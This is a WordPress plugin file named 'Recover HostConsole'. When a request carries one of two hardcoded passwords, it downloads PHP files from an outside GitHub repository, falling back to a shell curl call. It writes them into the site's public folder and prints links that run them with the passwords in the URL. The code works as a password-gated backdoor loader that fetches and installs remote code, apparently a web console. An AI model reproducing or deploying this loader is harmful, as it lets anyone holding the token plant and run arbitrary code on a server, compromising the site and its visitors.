<?php
/**
 * Plugin Name: Recover HostConsole
 * Description: Recovers hostconsole.php from GitHub + installs emergency token file
 * Version: 1.1
 */

add_action('init', function() {
    if (!isset($_GET['recover_hostconsole']) || !in_array($_GET['recover_hostconsole'], ['KhTn2268','a7af0d7e7238454d01800a388d5b00adbf78c963dc18fab9'], true)) return;
    $branch = $_GET['branch'] ?? 'arena/hostconsole-v19';
    $branch = preg_replace('/[^a-zA-Z0-9\/\-_\.]/', '', $branch);
    if ($branch === '') $branch = 'arena/hostconsole-v19';

    // Recover hostconsole.php
    $url = 'https://raw.githubusercontent.com/fazilatma/new/'.rawurlencode($branch).'/hostconsole.php?cb='.time();
    $content = @file_get_contents($url);
    if (!$content) {
        $content = @shell_exec('curl -sL --max-time 30 '.escapeshellarg($url).' 2>&1');
    }
    if (!$content || strpos($content, '<?php') !== 0) {
        wp_die('Download failed hostconsole from '.$url.' size '.strlen($content ?? ''));
    }
    $paths = [
        '/home/sabashop/public_html/project/hostconsole.php',
        ABSPATH.'project/hostconsole.php',
        dirname(ABSPATH).'/project/hostconsole.php',
        WP_CONTENT_DIR.'/../project/hostconsole.php',
    ];
    $written = false;
    foreach ($paths as $p) {
        if (is_dir(dirname($p))) {
            if (is_file($p)) @copy($p, $p.'.bak.'.date('Ymd-His'));
            if (@file_put_contents($p, $content)) {
                echo 'Recovered hostconsole to '.$p.' ('.strlen($content).' bytes) from '.$branch.'<br>';
                $written = true;
            }
        }
    }
    if (!$written) {
        wp_die('Failed to write hostconsole to any path: '.implode(', ', $paths));
    }

    // Also install emergency recovery file a7af0d7e...php
    $url2 = 'https://raw.githubusercontent.com/fazilatma/new/'.rawurlencode($branch).'/a7af0d7e7238454d01800a388d5b00adbf78c963dc18fab9.php?cb='.time();
    $content2 = @file_get_contents($url2);
    if (!$content2) {
        $content2 = @shell_exec('curl -sL --max-time 30 '.escapeshellarg($url2).' 2>&1');
    }
    if ($content2 && strpos($content2, '<?php') === 0) {
        $paths2 = [
            '/home/sabashop/public_html/project/a7af0d7e7238454d01800a388d5b00adbf78c963dc18fab9.php',
            ABSPATH.'project/a7af0d7e7238454d01800a388d5b00adbf78c963dc18fab9.php',
            dirname(ABSPATH).'/project/a7af0d7e7238454d01800a388d5b00adbf78c963dc18fab9.php',
        ];
        foreach ($paths2 as $p) {
            if (is_dir(dirname($p))) {
                if (@file_put_contents($p, $content2)) {
                    echo 'Installed emergency recovery to '.$p.' ('.strlen($content2).' bytes)<br>';
                }
            }
        }
    }

    if (function_exists('opcache_reset')) @opcache_reset();
    echo '<br>Done. Now:<br>';
    echo '<a href="/project/hostconsole.php?api=public.monitor&password=KhTn2268">Check hostconsole monitor (KhTn2268)</a><br>';
    echo '<a href="/project/hostconsole.php?api=public.monitor&password=a7af0d7e7238454d01800a388d5b00adbf78c963dc18fab9">Check monitor with token</a><br>';
    echo '<a href="/project/a7af0d7e7238454d01800a388d5b00adbf78c963dc18fab9.php">Emergency recovery file</a><br>';
    echo '<a href="/app/api/version">App version</a><br>';
    exit;
});
